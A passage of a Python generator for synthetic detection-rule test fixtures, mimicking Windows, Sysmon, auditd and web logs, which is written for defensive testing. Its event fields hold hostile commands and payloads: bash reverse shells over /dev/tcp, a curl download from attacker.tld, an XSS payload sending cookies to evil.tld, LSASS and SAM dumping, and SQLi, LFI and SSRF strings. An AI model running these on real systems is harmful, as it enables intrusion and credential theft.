#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Генерация синтетических фикстур для tools/rules-tester.py.

Фикстуры — НЕ настоящие логи, а синтетические события, повторяющие форму
полей целевых источников: Windows Security, Sysmon, Linux auditd,
access-лог веб-сервера, логи приложений/API-шлюза, AWS CloudTrail.

Пути Windows намеренно записаны прямыми слешами (`C:/Windows/...`): в реальной
телеметрии встречаются оба варианта, а для правил с `contains`/`endswith`
разница несущественна. Так генератор остаётся читаемым.

Запуск:  python3 detections/tests/generate_fixtures.py
Ожидания: detections/tests/manifest.json
Прогон:  python tools/rules-tester.py --verbose
"""

from __future__ import annotations

import json
from pathlib import Path

HERE = Path(__file__).resolve().parent

GUID_GET_CHANGES = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
GUID_GET_CHANGES_ALL = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"


WINDOWS_PATH_PREFIXES = ("C:/", "HKLM/", "HKCU/")


def windowsify(rows: list[dict]) -> list[dict]:
    """Превращает прямые слеши в обратные для Windows-путей и ключей реестра.

    В генераторе пути пишутся прямыми слешами (чтобы не возиться с
    экранированием в Python), а в фикстуру они попадают в том виде, в котором
    их даёт реальная телеметрия — с обратными слешами.
    """
    converted: list[dict] = []
    for row in rows:
        new_row = {}
        for key, value in row.items():
            if isinstance(value, str) and value.startswith(WINDOWS_PATH_PREFIXES):
                value = value.replace("/", "\\")
            elif isinstance(value, str) and "/" in value and " " not in value \
                    and value.startswith(("C:", "HK")):
                value = value.replace("/", "\\")
            new_row[key] = value
        converted.append(new_row)
    return converted


def write_jsonl(name: str, rows: list[dict], *, windows: bool = False) -> None:
    if windows:
        rows = windowsify(rows)
    path = HERE / name
    path.write_text("\n".join(json.dumps(row, ensure_ascii=False) for row in rows) + "\n",
                    encoding="utf-8")
    print(f"  {name}: {len(rows)} событий")


# ─────────────────────────── Windows Security ──────────────────────────
def windows_security() -> list[dict]:
    events: list[dict] = []

    # Kerberoasting: 4769 с RC4 (0x17) — 2 совпадения
    events.append({"EventID": 4769, "AccountName": "ivanov", "ServiceName": "MSSQLSvc/sql01",
                   "TicketEncryptionType": "0x17", "TicketOptions": "0x40810000",
                   "Status": "0x0", "IpAddress": "10.10.20.31",
                   "note": "kerberoast: RC4 для сервисного билета"})
    events.append({"EventID": 4769, "AccountName": "ivanov", "ServiceName": "HTTP/web01",
                   "TicketEncryptionType": "0x17", "TicketOptions": "0x40810000",
                   "Status": "0x0", "IpAddress": "10.10.20.31",
                   "note": "kerberoast: второй SPN той же учёткой"})
    events.append({"EventID": 4769, "AccountName": "svc_monitor", "ServiceName": "HTTP/app01",
                   "TicketEncryptionType": "0x18", "TicketOptions": "0x40810000",
                   "Status": "0x0", "IpAddress": "10.10.20.9",
                   "note": "легитимный запрос билета, AES256 — не совпадение"})

    # AS-REP roasting: 4768 с PreAuthType 0x0 — 1 совпадение
    events.append({"EventID": 4768, "AccountName": "svc_legacy", "PreAuthType": "0x0",
                   "Status": "0x0", "IpAddress": "10.10.20.44",
                   "note": "AS-REP без пред-аутентификации"})
    events.append({"EventID": 4768, "AccountName": "petrova", "PreAuthType": "0x2",
                   "Status": "0x0", "IpAddress": "10.10.20.15",
                   "note": "обычный AS-запрос с PA-ENC-TIMESTAMP — не совпадение"})

    # Перебор паролей: 4771 × 12 от одной учётки (count > 10)
    for index in range(12):
        events.append({"EventID": 4771, "AccountName": "admin", "Status": "0xc000006a",
                       "IpAddress": "10.10.20.77", "Sequence": index,
                       "note": "pre-auth failed: bruteforce"})
    events.append({"EventID": 4771, "AccountName": "guest", "Status": "0xc000006a",
                   "IpAddress": "10.10.20.77", "Sequence": 0,
                   "note": "одиночная ошибка — порог не превышен"})

    # Привилегированные группы: 4728 — 1 совпадение
    events.append({"EventID": 4728, "GroupName": "Domain Admins",
                   "MemberName": "CN=ivanov,OU=Users", "SubjectUserName": "helpdesk1",
                   "SubjectDomainName": "LAB", "note": "добавление в Domain Admins"})
    events.append({"EventID": 4732, "GroupName": "Print Operators",
                   "MemberName": "CN=svc_print", "SubjectUserName": "admin",
                   "SubjectDomainName": "LAB",
                   "note": "группа в списке, но попадает в filter_print — не совпадение"})
    events.append({"EventID": 4732, "GroupName": "Project Leads",
                   "MemberName": "CN=petrova", "SubjectUserName": "admin",
                   "SubjectDomainName": "LAB", "note": "непривилегированная группа"})

    # userAccountControl: 5136 — 2 совпадения
    events.append({"EventID": 5136, "ObjectDN": "CN=FILE01,OU=Servers",
                   "ObjectClass": "computer", "AttributeLDAPDisplayName": "userAccountControl",
                   "SubjectUserName": "ivanov", "note": "включён флаг делегирования"})
    events.append({"EventID": 5136, "ObjectDN": "CN=svc_backup,OU=Services",
                   "ObjectClass": "user", "AttributeLDAPDisplayName": "userAccountControl",
                   "SubjectUserName": "helpdesk2", "note": "DONT_REQ_PREAUTH у сервисной учётки"})
    events.append({"EventID": 5136, "ObjectDN": "CN=petrova,OU=Users",
                   "ObjectClass": "user", "AttributeLDAPDisplayName": "description",
                   "SubjectUserName": "petrova", "note": "другой атрибут — не совпадение"})

    # DCSync: 4662 — 1 совпадение
    events.append({"EventID": 4662, "ObjectType": "domainDNS",
                   "ObjectName": "DC=lab,DC=local",
                   "Properties": f"%{{{GUID_GET_CHANGES}}} %{{{GUID_GET_CHANGES_ALL}}}",
                   "AccessMask": "0x100", "SubjectUserName": "ivanov",
                   "SubjectDomainName": "LAB",
                   "note": "запрос прав репликации обычным пользователем"})
    events.append({"EventID": 4662, "ObjectType": "domainDNS",
                   "ObjectName": "DC=lab,DC=local", "Properties": f"%{{{GUID_GET_CHANGES}}}",
                   "AccessMask": "0x100", "SubjectUserName": "DC02$",
                   "SubjectDomainName": "LAB",
                   "note": "легитимная репликация между DC — отфильтровывается"})
    events.append({"EventID": 4662, "ObjectType": "user", "ObjectName": "CN=petrova",
                   "Properties": "%{54357131-1234-5678-9abc-def012345678}",
                   "AccessMask": "0x20", "SubjectUserName": "ivanov",
                   "SubjectDomainName": "LAB", "note": "обычный атрибут — не совпадение"})

    # ADCS ESC1: 4886/4887 — 2 совпадения
    events.append({"EventID": 4886, "Subject": "LAB/Administrator",
                   "Requester": "LAB/ivanov", "Template": "User",
                   "note": "запрос сертификата от имени администратора"})
    events.append({"EventID": 4887, "Subject": "CN=Domain Admin Service",
                   "Requester": "LAB/ivanov", "Template": "WebServer",
                   "note": "выпуск сертификата с привилегированным субъектом"})
    events.append({"EventID": 4887, "Subject": "LAB/petrova", "Requester": "LAB/petrova",
                   "Template": "User", "note": "обычный выпуск — не совпадение"})

    # SMB null-session и NTLM-relay (a7b8c9d0-0005, 0006)
    events.append({"EventID": 4624, "LogonType": 3, "TargetUserName": "ANONYMOUS LOGON",
                   "TargetDomainName": "", "AuthenticationPackageName": "NTLM",
                   "LogonProcessName": "NtLmSsp", "IpAddress": "10.10.20.93",
                   "WorkstationName": "", "note": "null-сессия: анонимный сетевой вход"})
    events.append({"EventID": 4624, "LogonType": 3, "TargetUserName": "ws01$",
                   "TargetDomainName": "LAB", "AuthenticationPackageName": "NTLM",
                   "LogonProcessName": "NtLmSsp", "IpAddress": "10.10.20.99",
                   "WorkstationName": "",
                   "note": "relay: вход машинной учётки с чужого IP (NTLM)"})
    events.append({"EventID": 4624, "LogonType": 3, "TargetUserName": "fs01$",
                   "TargetDomainName": "LAB", "AuthenticationPackageName": "NTLM",
                   "LogonProcessName": "NtLmSsp", "IpAddress": "10.10.20.99",
                   "WorkstationName": "",
                   "note": "relay: вторая машинная учётка с того же IP"})

    # RBCD / constrained delegation (a7b8c9d0-0008)
    events.append({"EventID": 5136, "ObjectDN": "CN=WS01,OU=Servers,DC=lab,DC=local",
                   "ObjectClass": "computer",
                   "AttributeLDAPDisplayName": "msDS-AllowedToActOnBehalfOfOtherIdentity",
                   "AttributeValue": "S-1-5-21-3124468979-1000004567-1000001234-1142",
                   "SubjectUserName": "ivanov", "SubjectDomainName": "LAB",
                   "note": "RBCD: компьютеру назначили делегирование"})
    events.append({"EventID": 5136, "ObjectDN": "CN=svc_sql,OU=Services,DC=lab,DC=local",
                   "ObjectClass": "user",
                   "AttributeLDAPDisplayName": "msDS-AllowedToDelegateTo",
                   "AttributeValue": "MSSQLSvc/db01.lab.local",
                   "SubjectUserName": "helpdesk1", "SubjectDomainName": "LAB",
                   "note": "constrained delegation включена сервисной учётке"})

    # GPP cpassword в SYSVOL (a7b8c9d0-0009)
    events.append({"EventID": 4663, "ObjectType": "File",
                   "ObjectName": "\\\\dc01\\SYSVOL\\lab.local\\Policies\\{31B2F340-016D-11D2}"
                                 "\\Machine\\Preferences\\Groups\\Groups.xml",
                   "AccessMask": "0x1", "SubjectUserName": "ivanov",
                   "SubjectDomainName": "LAB",
                   "note": "чтение Groups.xml из SYSVOL (поиск cpassword)"})
    events.append({"EventID": 4663, "ObjectType": "File",
                   "ObjectName": "\\\\dc01\\SYSVOL\\lab.local\\Policies\\{31B2F340-016D-11D2}"
                                 "\\Machine\\Preferences\\Services\\Services.xml",
                   "AccessMask": "0x1", "SubjectUserName": "ivanov",
                   "SubjectDomainName": "LAB",
                   "note": "чтение Services.xml из SYSVOL"})

    # LAPS: чтение ms-Mcs-AdmPwd (a7b8c9d0-0010)
    events.append({"EventID": 4662, "ObjectType": "computer",
                   "ObjectName": "CN=WS01,OU=Servers,DC=lab,DC=local",
                   "Properties": "%{ms-Mcs-AdmPwd}", "AccessMask": "0x100",
                   "SubjectUserName": "ivanov", "SubjectDomainName": "LAB",
                   "note": "обычный пользователь прочитал LAPS-пароль"})
    events.append({"EventID": 4662, "ObjectType": "computer",
                   "ObjectName": "CN=WS02,OU=Servers,DC=lab,DC=local",
                   "Properties": "%{ms-Mcs-AdmPwd}", "AccessMask": "0x100",
                   "SubjectUserName": "helpdesk1", "SubjectDomainName": "LAB",
                   "note": "helpdesk читает LAPS-пароль второй машины"})
    return events


# ───────────────────────────── Windows Sysmon ──────────────────────────
def windows_sysmon() -> list[dict]:
    rows: list[dict] = []

    # T1574.009 / T1543.003 — службы
    rows.append({"EventID": 7045, "ServiceName": "HBService", "ServiceType": "user mode service",
                 "ImagePath": "C:/Users/Public/svchost.exe", "AccountName": "LAB/ivanov",
                 "note": "новая служба из записываемого каталога"})
    rows.append({"EventID": 7045, "ServiceName": "LegitUpdater", "ServiceType": "user mode service",
                 "ImagePath": "C:/Program Files/Vendor/updater.exe", "AccountName": "LAB/admin",
                 "Signature": "Microsoft Windows", "note": "легитимная служба — не совпадение"})
    rows.append({"EventID": 1, "Image": "C:/Users/Public/svchost.exe",
                 "ParentImage": "C:/Windows/System32/services.exe",
                 "CommandLine": "C:/Users/Public/svchost.exe", "User": "NT AUTHORITY/SYSTEM",
                 "note": "процесс службы из пользовательского каталога"})
    rows.append({"EventID": 1, "Image": "C:/Windows/System32/sc.exe",
                 "ParentImage": "C:/Windows/System32/cmd.exe",
                 "CommandLine": "sc config HBService binPath= C:/Temp/evil.exe",
                 "User": "LAB/ivanov", "note": "подмена binPath через sc config"})
    rows.append({"EventID": 1, "Image": "C:/Windows/System32/sc.exe",
                 "ParentImage": "C:/Windows/System32/cmd.exe",
                 "CommandLine": "sc query HBService", "User": "LAB/ivanov",
                 "note": "обычный query — не совпадение"})

    # T1134 / T1548.002 — привилегии токена, UAC-обход
    rows.append({"EventID": 4674, "AccountName": "ivanov", "ObjectName": "SeDebugPrivilege",
                 "PrivilegeList": "SeDebugPrivilege", "note": "использование SeDebugPrivilege"})
    rows.append({"EventID": 4674, "AccountName": "backup-svc", "ObjectName": "SeBackupPrivilege",
                 "PrivilegeList": "SeBackupPrivilege", "note": "резервное копирование (легитимно)"})
    rows.append({"EventID": 1, "Image": "C:/Windows/System32/fodhelper.exe",
                 "ParentImage": "C:/Windows/System32/cmd.exe", "CommandLine": "fodhelper.exe",
                 "User": "LAB/ivanov", "note": "auto-elevate бинарник (UAC-обход)"})
    rows.append({"EventID": 1, "Image": "C:/Windows/System32/notepad.exe",
                 "ParentImage": "C:/Windows/explorer.exe", "CommandLine": "notepad.exe",
                 "User": "LAB/petrova", "note": "обычное приложение — не совпадение"})

    # T1003 — LSASS, теневые копии, выгрузка SAM
    rows.append({"EventID": 10, "SourceImage": "C:/Temp/proc.exe",
                 "TargetImage": "C:/Windows/System32/lsass.exe", "GrantedAccess": "0x1010",
                 "note": "открытие LSASS сторонним процессом"})
    rows.append({"EventID": 1, "Image": "C:/Windows/System32/vssadmin.exe",
                 "ParentImage": "C:/Windows/System32/cmd.exe",
                 "CommandLine": "vssadmin create shadow /for=C:", "User": "LAB/ivanov",
                 "note": "создание теневой копии"})
    rows.append({"EventID": 1, "Image": "C:/Windows/System32/reg.exe",
                 "ParentImage": "C:/Windows/System32/cmd.exe",
                 "CommandLine": "reg save HKLM/sam C:/Temp/sam.hiv", "User": "LAB/ivanov",
                 "note": "выгрузка куста SAM"})
    rows.append({"EventID": 11, "Image": "C:/Windows/System32/rundll32.exe",
                 "TargetFilename": "C:/Temp/lsass.dmp", "User": "LAB/ivanov",
                 "note": "dump-файл LSASS"})
    rows.append({"EventID": 1, "Image": "C:/Windows/System32/rundll32.exe",
                 "ParentImage": "C:/Windows/System32/cmd.exe",
                 "CommandLine": "rundll32.exe comsvcs.dll, MiniDump 720 C:/Temp/lsass.dmp full",
                 "User": "LAB/ivanov", "note": "дамп через comsvcs"})

    # T1574.001 — DLL hijacking
    rows.append({"EventID": 7, "Image": "C:/Program Files/Vendor/app.exe",
                 "ImageLoaded": "C:/Users/Public/version.dll", "Signed": "false",
                 "User": "NT AUTHORITY/SYSTEM", "note": "DLL из пользовательского каталога"})
    rows.append({"EventID": 11, "Image": "C:/Windows/explorer.exe",
                 "TargetFilename": "C:/Program Files/Vendor/msvcp140.dll",
                 "User": "LAB/ivanov", "note": "новая DLL в Program Files"})
    rows.append({"EventID": 7, "Image": "C:/Program Files/Vendor/app.exe",
                 "ImageLoaded": "C:/Program Files/Vendor/legit.dll", "Signed": "true",
                 "User": "NT AUTHORITY/SYSTEM", "note": "легитимная DLL — не совпадение"})

    # T1547.001 / T1546.012 — автозапуск и IFEO
    rows.append({"EventID": 13, "Image": "C:/Windows/System32/reg.exe",
                 "TargetObject": "HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/"
                                 "Image File Execution Options/sethc.exe/Debugger",
                 "Details": "C:/Windows/System32/cmd.exe", "User": "LAB/ivanov",
                 "note": "sticky-keys: Debugger у sethc.exe"})
    rows.append({"EventID": 13, "Image": "C:/Windows/System32/reg.exe",
                 "TargetObject": "HKCU/Software/Microsoft/Windows/CurrentVersion/Run/Updater",
                 "Details": "C:/Users/Public/updater.exe", "User": "LAB/ivanov",
                 "note": "Run-ключ со значением из пользовательского каталога"})
    rows.append({"EventID": 13, "Image": "C:/Windows/System32/reg.exe",
                 "TargetObject": "HKCU/Software/Microsoft/Windows/CurrentVersion/Run/OneDrive",
                 "Details": "C:/Users/ivanov/AppData/Local/Microsoft/OneDrive/OneDrive.exe",
                 "User": "LAB/ivanov", "note": "легитимный Run-ключ — не совпадение"})
    rows.append({"EventID": 13, "Image": "C:/Windows/System32/reg.exe",
                 "TargetObject": "HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/"
                                 "Winlogon/Shell",
                 "Details": "explorer.exe, C:/Temp/loader.exe", "User": "LAB/ivanov",
                 "note": "подмена Winlogon Shell"})

    # T1082 / T1087 / T1007 — перечисление
    recon = ["whoami /priv", "net localgroup Administrators", "sc query state= all",
             "schtasks /query /fo LIST /v", "systeminfo", "wmic qfe get HotFixID",
             'icacls "C:/Program Files/Vendor/"', "cmdkey /list", "netstat -ano"]
    for command in recon:
        rows.append({"EventID": 4688, "AccountName": "ivanov", "LogonId": "0x3e7a1",
                     "ParentProcessName": "C:/Windows/System32/cmd.exe",
                     "CommandLine": command})
    rows.append({"EventID": 4688, "AccountName": "petrova", "LogonId": "0x3e7b2",
                 "ParentProcessName": "C:/Windows/explorer.exe", "CommandLine": "whoami",
                 "note": "одиночная команда другого пользователя — порог не превышен"})
    rows.append({"EventID": 4688, "AccountName": "scanner-svc", "LogonId": "0x3e7c3",
                 "ParentProcessName": "C:/Program Files/Scanner/scan.exe",
                 "CommandLine": "winpeas.exe -a", "note": "инструмент перечисления"})

    # xp_cmdshell: СУБД порождает оболочку (e5f6a7b8-0022)
    rows.append({"EventID": 1, "Image": "C:/Windows/System32/cmd.exe",
                 "ParentImage": "C:/Program Files/Microsoft SQL Server/"
                                "MSSQL15.MSSQLSERVER/MSSQL/Binn/sqlservr.exe",
                 "CommandLine": "cmd.exe /c whoami", "User": "NT AUTHORITY/NETWORK SERVICE",
                 "note": "sqlservr.exe породил cmd.exe — xp_cmdshell"})
    rows.append({"EventID": 1, "Image": "C:/Program Files/Microsoft SQL Server/"
                                       "MSSQL15.MSSQLSERVER/MSSQL/Binn/sqlservr.exe",
                 "ParentImage": "C:/Windows/System32/services.exe",
                 "CommandLine": "\"C:/Program Files/Microsoft SQL Server/sqlservr.exe\" -sMSSQLSERVER",
                 "User": "NT AUTHORITY/SYSTEM",
                 "note": "штатный запуск sqlservr — не совпадение"})
    return rows


# ─────────────────────────────── Linux auditd ──────────────────────────
def linux_auditd() -> list[dict]:
    rows: list[dict] = []

    # T1548.001 — SUID из нестандартного каталога
    rows.append({"EventType": "EXECVE", "Image": "/usr/local/bin/backup-tool",
                 "CommandLine": "/usr/local/bin/backup-tool -cf /dev/null --checkpoint=1",
                 "ParentImage": "/bin/bash", "User": "ivanov", "auid": 1000, "euid": 0,
                 "note": "SUID-обёртка из /usr/local/bin"})
    rows.append({"EventType": "EXECVE", "Image": "/usr/bin/sudo",
                 "CommandLine": "/usr/bin/sudo /usr/bin/systemctl restart nginx",
                 "ParentImage": "/bin/bash", "User": "petrova", "auid": 1001, "euid": 0,
                 "note": "штатный sudo-вызов из эталонного набора — не совпадение"})

    # T1053.003 / T1574.007 — cron и PATH-подмена
    rows.append({"EventType": "EXECVE", "Image": "/tmp/backup.sh",
                 "CommandLine": "/tmp/backup.sh", "ParentImage": "/usr/sbin/cron",
                 "User": "root", "auid": 0, "euid": 0,
                 "note": "задача cron исполняет скрипт из /tmp"})
    rows.append({"EventType": "EXECVE", "Image": "/dev/shm/helper",
                 "CommandLine": "/dev/shm/helper", "ParentImage": "/usr/sbin/crond",
                 "User": "root", "auid": 0, "euid": 0,
                 "note": "задача root исполняет файл из /dev/shm"})
    rows.append({"EventType": "EXECVE", "Image": "/usr/bin/logrotate",
                 "CommandLine": "/usr/bin/logrotate /etc/logrotate.conf",
                 "ParentImage": "/usr/sbin/cron", "User": "root", "auid": 0, "euid": 0,
                 "note": "штатная задача cron — не совпадение"})

    # T1548.003 — sudo на интерактивные программы
    rows.append({"EventType": "SUDO_COMMAND", "User": "ivanov",
                 "Command": "/usr/bin/vim /etc/nginx/nginx.conf", "Pwd": "/home/ivanov",
                 "Tty": "pts/0", "note": "sudo vim — выход в оболочку через :!"})
    rows.append({"EventType": "SUDO_COMMAND", "User": "ivanov",
                 "Command": "/usr/bin/find . -exec /bin/sh ;", "Pwd": "/tmp",
                 "Tty": "pts/1", "note": "sudo find -exec"})
    rows.append({"EventType": "SUDO_COMMAND", "User": "automation",
                 "Command": "/usr/bin/tar -czf /backup/db.tgz /var/lib/db", "Pwd": "/",
                 "Tty": "", "note": "сервисная учётка — исключение filter_admin"})

    # T1548 — файлы учёток, PAM, capabilities
    rows.append({"EventType": "PATH", "Name": "/etc/passwd", "Image": "/usr/bin/nano",
                 "User": "ivanov", "auid": 1000, "euid": 1000,
                 "note": "правка /etc/passwd пользователем"})
    rows.append({"EventType": "PATH", "Name": "/etc/sudoers", "Image": "/usr/bin/tee",
                 "User": "ivanov", "auid": 1000, "euid": 1000,
                 "note": "правка sudoers не через visudo"})
    rows.append({"EventType": "PATH", "Name": "/etc/pam.d/sshd", "Image": "/usr/bin/vim",
                 "User": "ivanov", "auid": 1000, "euid": 1000, "note": "правка PAM-конфига"})
    rows.append({"EventType": "EXECVE", "Image": "/usr/bin/python3",
                 "CommandLine": "python3 -c import os;os.setuid(0);os.system(/bin/sh)",
                 "Capabilities": "cap_setuid+ep", "ParentImage": "/bin/bash",
                 "User": "ivanov", "auid": 1000, "euid": 0,
                 "note": "бинарник с cap_setuid"})
    rows.append({"EventType": "SYSCALL", "Syscall": "init_module", "Image": "/tmp/insmod",
                 "User": "ivanov", "auid": 1000, "euid": 0,
                 "note": "загрузка модуля ядра"})
    rows.append({"EventType": "PATH", "Name": "/home/ivanov/.ssh/authorized_keys",
                 "Image": "/usr/bin/bash", "User": "ivanov", "auid": 1000, "euid": 1000,
                 "note": "добавление ключа — закрепление"})

    # T1068 — pkexec/sudo аномалии
    rows.append({"EventType": "EXECVE", "Image": "/usr/bin/pkexec",
                 "CommandLine": "pkexec GCONV_PATH=/tmp/evil /usr/bin/true",
                 "ParentImage": "/bin/bash", "User": "ivanov", "auid": 1000, "euid": 0,
                 "note": "PwnKit-паттерн"})
    rows.append({"EventType": "EXECVE", "Image": "/usr/bin/sudo",
                 "CommandLine": "sudo --version= -s", "ParentImage": "/bin/bash",
                 "User": "ivanov", "auid": 1000, "euid": 0, "note": "Baron Samedit-паттерн"})

    # T1082 / T1083 — перечисление
    rows.append({"EventType": "EXECVE", "Image": "/usr/bin/sh",
                 "CommandLine": "/bin/sh /tmp/linpeas.sh -a", "ParentImage": "/bin/bash",
                 "User": "ivanov", "auid": 1000, "euid": 1000,
                 "note": "инструмент перечисления"})
    rows.append({"EventType": "EXECVE", "Image": "/usr/bin/getcap",
                 "CommandLine": "getcap -r /", "ParentImage": "/bin/bash",
                 "User": "ivanov", "auid": 1000, "euid": 1000,
                 "note": "инвентаризация capabilities"})
    rows.append({"EventType": "EXECVE", "Image": "/usr/bin/cat",
                 "CommandLine": "cat /etc/shadow", "ParentImage": "/bin/bash",
                 "User": "ivanov", "auid": 1000, "euid": 1000, "note": "чтение shadow"})
    rows.append({"EventType": "EXECVE", "Image": "/usr/bin/ls",
                 "CommandLine": "ls -la /home/ivanov", "ParentImage": "/bin/bash",
                 "User": "ivanov", "auid": 1000, "euid": 1000,
                 "note": "обычная команда — не совпадение"})

    # Дочерние процессы веб-сервера — host-детект command injection/RCE (e5f6a7b8-0011)
    rows.append({"EventType": "EXECVE", "Image": "/bin/sh",
                 "CommandLine": "/bin/sh -c id", "ParentImage": "/usr/sbin/apache2",
                 "User": "www-data", "auid": 4294967295, "euid": 33,
                 "note": "apache2 породил оболочку — инъекция команд"})
    rows.append({"EventType": "EXECVE", "Image": "/usr/bin/python3",
                 "CommandLine": "python3 -c import pty;pty.spawn(/bin/bash)",
                 "ParentImage": "/usr/sbin/nginx",
                 "User": "www-data", "auid": 4294967295, "euid": 33,
                 "note": "nginx породил pty — reverse shell"})
    rows.append({"EventType": "EXECVE", "Image": "/bin/bash",
                 "CommandLine": "bash -i >& /dev/tcp/10.10.20.99/4444 0>&1",
                 "ParentImage": "/usr/bin/php-fpm",
                 "User": "www-data", "auid": 4294967295, "euid": 33,
                 "note": "php-fpm породил bash reverse shell"})
    rows.append({"EventType": "EXECVE", "Image": "/usr/bin/curl",
                 "CommandLine": "curl http://attacker.tld/x.sh -o /tmp/x.sh",
                 "ParentImage": "/bin/sh", "User": "www-data",
                 "auid": 4294967295, "euid": 33,
                 "note": "загрузка второй стадии от имени www-data"})

    # COPY TO PROGRAM: postgres пишет файл (e5f6a7b8-0037)
    rows.append({"EventType": "PATH", "Name": "/tmp/pwned",
                 "Image": "/usr/lib/postgresql/15/bin/postgres",
                 "ParentImage": "/usr/lib/postgresql/15/bin/postgres",
                 "User": "postgres", "auid": 4294967295, "euid": 1001,
                 "note": "файл создан процессом СУБД — COPY TO PROGRAM"})

    # Upload-атаки на файловой системе (e5f6a7b8-0056, 0061)
    rows.append({"EventType": "PATH", "Name": "/var/www/html/uploads/.htaccess",
                 "Image": "/usr/sbin/apache2", "ParentImage": "/usr/sbin/apache2",
                 "User": "www-data", "auid": 4294967295, "euid": 33,
                 "note": ".htaccess записан процессом веб-сервера"})
    rows.append({"EventType": "PATH", "Name": "/var/www/html/shell.php",
                 "Image": "/usr/bin/unzip", "ParentImage": "/usr/bin/php",
                 "User": "www-data", "auid": 4294967295, "euid": 33,
                 "note": "Zip Slip: unzip записал файл вне каталога распаковки"})

    # LFI на стороне файловой системы: веб-процесс читает чувствительный файл (e5f6a7b8-0067)
    rows.append({"EventType": "EXECVE", "Image": "/bin/cat",
                 "CommandLine": "cat /etc/passwd", "ParentImage": "/usr/sbin/apache2",
                 "User": "www-data", "auid": 4294967295, "euid": 33,
                 "note": "дочерний процесс веб-сервера читает /etc/passwd"})

    # RCE через десериализацию: интерпретаторы порождают оболочку (e5f6a7b8-0114, 0115)
    rows.append({"EventType": "EXECVE", "Image": "/bin/sh",
                 "CommandLine": "/bin/sh -c id", "ParentImage": "/usr/bin/python3",
                 "User": "www-data", "auid": 4294967295, "euid": 33,
                 "note": "python-воркер породил shell — pickle RCE"})
    rows.append({"EventType": "EXECVE", "Image": "/usr/bin/bash",
                 "CommandLine": "bash -i >& /dev/tcp/10.10.20.99/1389 0>&1",
                 "ParentImage": "/usr/bin/java", "User": "tomcat",
                 "auid": 4294967295, "euid": 512,
                 "note": "java (Tomcat) породил bash — JNDI/RMI RCE"})

    # docker-socket escape (f6a7b8c9-0019)
    rows.append({"EventType": "EXECVE", "Image": "/usr/bin/docker",
                 "CommandLine": "docker -H unix:///var/run/docker.sock run -v /:/host "
                                "--rm -it alpine chroot /host",
                 "ParentImage": "/usr/bin/containerd-shim-runc-v2",
                 "User": "root", "auid": 4294967295, "euid": 0,
                 "note": "побег из контейнера: docker.sock + монтирование корня"})
    rows.append({"EventType": "PATH", "Name": "/var/run/docker.sock",
                 "Image": "/usr/bin/curl", "ParentImage": "/bin/sh",
                 "User": "www-data", "auid": 4294967295, "euid": 33,
                 "note": "приложение обращается к docker.sock (сокет проброшен в контейнер)"})
    return rows


# ─────────────────────────────── Web / приложения ──────────────────────
def webserver() -> list[dict]:
    return [
        {"c-ip": "10.10.20.5", "cs-method": "GET", "cs-uri-stem": "/uploads/avatar.php",
         "cs-uri-query": "c=id", "sc-status": 200, "cs-user-agent": "curl/8.4.0",
         "note": "webshell в каталоге загрузок"},
        {"c-ip": "10.10.20.5", "cs-method": "GET", "cs-uri-stem": "/uploads/shell.phtml",
         "cs-uri-query": "", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "альтернативное исполняемое расширение"},
        {"c-ip": "10.10.20.5", "cs-method": "GET", "cs-uri-stem": "/uploads/photo.png",
         "cs-uri-query": "", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "обычное изображение — не совпадение"},
        {"c-ip": "10.10.20.6", "cs-method": "GET", "cs-uri-stem": "/uploads/old.php",
         "cs-uri-query": "", "sc-status": 404, "cs-user-agent": "Googlebot/2.1",
         "note": "404 отфильтровывается правилом"},
        {"c-ip": "10.10.20.7", "cs-method": "GET", "cs-uri-stem": "/assets/app.php",
         "cs-uri-query": "", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "скрипт вне каталога загрузок — не совпадение"},
        {"c-ip": "10.10.20.5", "cs-method": "GET", "cs-uri-stem": "/echo",
         "cs-uri-query": "q=<script>alert(document.domain)</script>", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "XSS-вектор в параметре"},
        {"c-ip": "10.10.20.5", "cs-method": "GET", "cs-uri-stem": "/profile",
         "cs-uri-query": "bio=<img src=x onerror=fetch('//evil.tld/'+document.cookie)>",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0", "note": "XSS через атрибут"},
        {"c-ip": "10.10.20.5", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=-1 union select 1,name,3,secret_note from items-- ",
         "sc-status": 500, "cs-user-agent": "sqlmap/1.8",
         "note": "SQLi: декодированная query + 500"},
        {"c-ip": "10.10.20.5", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1 AND 1=1 union select null,null,null from information_schema.tables-- ",
         "sc-status": 200, "cs-user-agent": "sqlmap/1.8",
         "note": "SQLi: information_schema + сканерный UA"},
        {"c-ip": "10.10.20.5", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "обычный запрос — не совпадение"},
        {"c-ip": "10.10.20.5", "cs-method": "GET", "cs-uri-stem": "/read",
         "cs-uri-query": "file=../../../../etc/passwd", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "LFI traversal"},
        {"c-ip": "10.10.20.8", "cs-method": "GET", "cs-uri-stem": "/read",
         "cs-uri-query": "file=readme.txt", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "легитимное чтение — не совпадение"},
        {"c-ip": "10.10.20.9", "cs-method": "GET", "cs-uri-stem": "/fetch",
         "cs-uri-query": "url=http://169.254.169.254/latest/meta-data/",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0", "note": "SSRF на метаданные"},
        {"c-ip": "10.10.20.9", "cs-method": "GET", "cs-uri-stem": "/fetch",
         "cs-uri-query": "url=file:///etc/passwd", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "SSRF через file://"},
        {"c-ip": "10.10.20.9", "cs-method": "GET", "cs-uri-stem": "/fetch",
         "cs-uri-query": "url=http://127.0.0.1:6379/", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "SSRF на локальный сервис"},
        {"c-ip": "10.10.20.9", "cs-method": "GET", "cs-uri-stem": "/fetch",
         "cs-uri-query": "url=https://example.com/img.png", "sc-status": 200,
